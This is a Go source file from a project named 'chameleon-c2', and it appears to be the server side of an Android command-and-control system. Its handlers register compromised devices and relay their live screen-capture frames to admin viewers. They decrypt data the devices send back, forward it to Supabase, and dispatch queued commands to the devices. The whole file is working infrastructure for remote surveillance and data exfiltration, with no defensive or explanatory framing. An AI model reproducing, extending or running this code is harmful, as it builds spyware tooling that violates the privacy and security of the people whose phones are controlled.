package server

import (
	"encoding/json"
	"log"

	"github.com/your-org/chameleon-c2/internal/crypto"
	"github.com/your-org/chameleon-c2/internal/types"
)

func (s *Server) handleMessage(client *Client, msg types.WSMessage) {
	switch msg.Type {
	case types.MsgRegister:
		s.handleRegister(client, msg)
	case types.MsgHeartbeat:
		s.handleHeartbeat(client, msg)
	case types.MsgData:
		s.handleData(client, msg)
	case types.MsgCommandAck:
		s.handleCommandAck(client, msg)
	case types.MsgScreenState:
		s.handleScreenState(client, msg)
	default:
		log.Printf("unknown message type from %s: %s", client.DeviceID, msg.Type)
	}
}

func (s *Server) handleBinaryFrame(client *Client, data []byte) {
	if client.DeviceID == "" {
		log.Printf("binary frame from unregistered device")
		return
	}
	log.Printf("binary frame from %s: %d bytes", client.DeviceID, len(data))
	// Binary frames are stream JPEGs — relay to admin viewers
	s.adminHub.BroadcastFrame(client.DeviceID, data)
}

func (s *Server) handleScreenState(client *Client, msg types.WSMessage) {
	var state types.ScreenStateData
	if err := json.Unmarshal(msg.Data, &state); err != nil {
		log.Printf("invalid screen state data from %s: %v", client.DeviceID, err)
		return
	}
	if err := s.db.UpdateScreenState(client.DeviceID, state.State); err != nil {
		log.Printf("screen state update failed for %s: %v", client.DeviceID, err)
	}
	log.Printf("screen state for %s: %s", client.DeviceID, state.State)
}

func (s *Server) handleRegister(client *Client, msg types.WSMessage) {
	var reg types.RegisterMessage
	if err := json.Unmarshal(msg.Data, &reg); err != nil {
		log.Printf("invalid register data: %v", err)
		client.SendMessage(types.WSMessage{Type: types.MsgError, Error: "invalid register data"})
		return
	}

	client.DeviceID = reg.DeviceID

	info := types.DeviceInfo{
		DeviceID:       reg.DeviceID,
		DeviceName:     reg.DeviceName,
		Manufacturer:   reg.Manufacturer,
		Model:          reg.Model,
		AndroidVersion: reg.AndroidVersion,
		APiLevel:       reg.APiLevel,
		IPAddress:      client.Conn.RemoteAddr().String(),
	}

	if err := s.db.RegisterDevice(info); err != nil {
		log.Printf("failed to register device %s: %v", reg.DeviceID, err)
		client.SendMessage(types.WSMessage{Type: types.MsgError, Error: "registration failed"})
		return
	}

	s.hub.Register(reg.DeviceID, client)
	log.Printf("device registered: %s (%s %s)", reg.DeviceID, reg.Manufacturer, reg.Model)

	client.SendMessage(types.WSMessage{
		Type:    types.MsgRegister,
		Status:  "ok",
		DeviceID: reg.DeviceID,
	})

	// Send any pending commands
	cmds, err := s.db.GetPendingCommands(reg.DeviceID)
	if err != nil {
		log.Printf("failed to get pending commands for %s: %v", reg.DeviceID, err)
		return
	}
	for _, cmd := range cmds {
		client.SendCommand(cmd)
	}
}

func (s *Server) handleHeartbeat(client *Client, msg types.WSMessage) {
	var hb types.HeartbeatMessage
	if err := json.Unmarshal(msg.Data, &hb); err != nil {
		return
	}

	if err := s.db.UpdateHeartbeat(hb.DeviceID); err != nil {
		log.Printf("heartbeat update failed for %s: %v", hb.DeviceID, err)
	}
}

func (s *Server) handleData(client *Client, msg types.WSMessage) {
	var payload types.DataPayload
	if err := json.Unmarshal(msg.Data, &payload); err != nil {
		log.Printf("invalid data payload from %s: %v", client.DeviceID, err)
		return
	}

	// Decrypt the payload
	masterSecret := s.config.MasterSecret
	key := crypto.DeriveKey(payload.DeviceID, masterSecret)
	plaintext, err := crypto.Decrypt(payload.Payload, key)
	if err != nil {
		log.Printf("decryption failed for data from %s: %v", payload.DeviceID, err)
		return
	}

	// Log receipt
	summary := string(plaintext)
	if len(summary) > 100 {
		summary = summary[:100]
	}
	if err := s.db.LogDataReceived(payload.DeviceID, payload.DataType, summary); err != nil {
		log.Printf("failed to log data receipt: %v", err)
	}

	// Forward to Supabase
	if s.supabase != nil {
		if err := s.supabase.ForwardData(payload.DataType, payload.DeviceID, plaintext); err != nil {
			log.Printf("supabase forward failed: %v", err)
		}
	}

	log.Printf("data received from %s type=%s size=%d", payload.DeviceID, payload.DataType, len(plaintext))
}

func (s *Server) handleCommandAck(client *Client, msg types.WSMessage) {
	var ack types.CommandAck
	if err := json.Unmarshal(msg.Data, &ack); err != nil {
		return
	}

	if err := s.db.UpdateCommandStatus(ack.CommandID, ack.Status, ack.Result); err != nil {
		log.Printf("failed to update command %s status: %v", ack.CommandID, err)
	}

	log.Printf("command %s ack from %s: %s", ack.CommandID, client.DeviceID, ack.Status)
}
